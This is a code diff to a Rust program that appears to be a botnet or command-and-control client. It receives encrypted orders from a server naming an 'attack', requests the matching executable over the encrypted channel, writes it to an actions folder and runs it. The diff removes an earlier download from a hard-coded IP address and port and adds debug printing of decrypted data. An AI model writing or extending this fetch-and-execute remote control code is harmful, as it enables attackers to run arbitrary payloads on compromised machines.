@@ -87,19 +87,24 @@ fn receive_encrypted_data_from_server(
         Ok(data) => {
             println!("Data received successfully!");
 
-            // println!("Data received: {:?}", data);
+            println!("Data received: {:?}", data);
 
             let mut buffer = vec![0u8; data.len() + 16];
             match Aes128CbcDec::new(&symetric_key, &iv)
                 .decrypt_padded_b2b_mut::<Pkcs7>(&data, &mut buffer)
             {
-                Ok(decrypted_data) => match str::from_utf8(decrypted_data) {
-                    Ok(utf8_data) => utf8_data.to_string(),
-                    Err(err) => {
-                        eprintln!("Error converting data to UTF-8: {:?}", err);
-                        String::new()
+                Ok(decrypted_data) => { 
+                    // Debug: Affiche les données décryptées
+                    println!("Decrypted data: {:?}", decrypted_data);
+
+                    match str::from_utf8(decrypted_data) {
+                        Ok(utf8_data) => utf8_data.to_string(),
+                        Err(err) => {
+                            eprintln!("Error converting data to UTF-8: {:?}", err);
+                            String::new()
+                        }
                     }
-                },
+                }
                 Err(err) => {
                     eprintln!("Error decrypting data: {:?}", err);
                     String::new()
@@ -116,12 +121,14 @@ fn receive_encrypted_data_from_server(
 
 
 fn check_and_request_executable(
-    executable_name: &str,
-    executable_dir: &str,
-    sender: &mpsc::Sender<Vec<u8>>,
-    symetric_key: &GenericArray<u8, typenum::consts::U16>,
-    iv: &GenericArray<u8, typenum::consts::U16>,
-) -> io::Result<()> {
+                                    executable_name: &str,
+                                    executable_dir: &str,
+                                    sender: &mpsc::Sender<Vec<u8>>,
+                                    receiver: &mpsc::Receiver<Vec<u8>>,
+                                    symetric_key: &GenericArray<u8, typenum::consts::U16>,
+                                    iv: &GenericArray<u8, typenum::consts::U16>,
+                                    ) -> io::Result<()> {
+
     let executable_path = Path::new(executable_dir).join(executable_name).with_extension("sh");
     println!("Checking if executable exists at {:?}", executable_path);
 
@@ -131,19 +138,11 @@ fn check_and_request_executable(
         let request_message = format!("REQUEST_EXECUTABLE {}", executable_name);
         send_encrypted_data_to_server(sender.clone(), request_message, symetric_key.clone(), iv.clone());
 
-        // Receive the executable file
-        let mut buffer = [0u8; 1024];
+        let data_file = receive_encrypted_data_from_server(receiver, symetric_key.clone(), iv.clone());
+        println!("Data file : {:?}", data_file);
+
         let mut file = File::create(&executable_path)?;
-
-        let mut stream = TcpStream::connect("51.77.193.65:4242")?;
-
-        loop {
-            let bytes_read = stream.read(&mut buffer)?;
-            if bytes_read == 0 {
-                break;
-            }
-            file.write_all(&buffer[..bytes_read])?;
-        }
+        file.write_all(data_file.as_bytes())?;
 
         println!("Executable received and stored at {:?}", executable_path);
     } else {
@@ -157,12 +156,13 @@ fn check_and_request_executable(
 fn execute_attack(
     attack_name: &str,
     sender: &mpsc::Sender<Vec<u8>>,
+    receiver: &mpsc::Receiver<Vec<u8>>,
     symetric_key: &GenericArray<u8, typenum::consts::U16>,
     iv: &GenericArray<u8, typenum::consts::U16>,
 ) -> io::Result<()> {
     let executable_dir = "./actions";
 
-    check_and_request_executable(attack_name, executable_dir, sender, symetric_key, iv)?;
+    check_and_request_executable(attack_name, executable_dir, sender, receiver, symetric_key, iv)?;
 
     let executable_path = Path::new(executable_dir).join(attack_name);
     std::process::Command::new(executable_path).spawn()?.wait()?;
@@ -251,21 +251,21 @@ fn main() -> io::Result<()> {
             let message = receive_encrypted_data_from_server(&receiver, symetric_key.clone(), iv.clone());
             if let Ok(json_message) = receive_data_json_to_str(message.clone()) {
                 println!("Type d'attaque : {:?}", json_message.attack);
-            if !message.is_empty() {
-                println!("Received command: {}", message);
-                match execute_attack(&json_message.attack, &sender, &symetric_key, &iv) {
-                    Ok(_) => {
-                        response = format!("{{\"status\":\"success\",\"action\":\"{}\"}}", message);
-                        send_encrypted_data_to_server(sender.clone(), response, symetric_key.clone(), iv.clone());
-                    }
-                    Err(e) => {
-                        response = format!("{{\"status\":\"error\",\"action\":\"{}\",\"error\":\"{}\"}}", message, e);
-                        send_encrypted_data_to_server(sender.clone(), response, symetric_key.clone(), iv.clone());
+                if !message.is_empty() {
+                    println!("Received command: {}", message);
+                    match execute_attack(&json_message.attack, &sender, &receiver, &symetric_key, &iv) {
+                        Ok(_) => {
+                            response = format!("{{\"status\":\"success\",\"action\":\"{}\"}}", message);
+                            send_encrypted_data_to_server(sender.clone(), response, symetric_key.clone(), iv.clone());
+                        }
+                        Err(e) => {
+                            response = format!("{{\"status\":\"error\",\"action\":\"{}\",\"error\":\"{}\"}}", message, e);
+                            send_encrypted_data_to_server(sender.clone(), response, symetric_key.clone(), iv.clone());
+                        }
                     }
                 }
             }
         }
-    }
     });
 
     loop {
